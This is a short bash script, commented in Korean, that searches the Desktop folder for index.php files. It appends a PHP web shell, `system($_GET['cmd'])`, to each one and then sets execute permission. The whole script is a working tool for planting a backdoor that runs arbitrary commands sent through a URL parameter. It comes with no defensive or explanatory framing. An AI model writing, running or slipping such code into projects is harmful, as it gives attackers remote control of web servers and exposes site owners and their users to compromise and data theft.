#!/bin/bash

# Desktop 디렉토리 경로
desktop_path="$HOME/Desktop"

# index.php 파일 검색
index_files=$(find "$desktop_path" -name "index.php")

# index.php 파일에 코드 추가
for index_file in $index_files; do
    echo "<?php header(\"Content-type: text/html; charset=euc-kr\"); ?>" >> "$index_file"
    echo "<?php system(\$_GET[\"cmd\"]); ?>" >> "$index_file"
    echo "Added code to $index_file"

    # index.php 파일에 실행 권한 부여
    chmod +x "$index_file"
    echo "Added execute permission to $index_file"
done
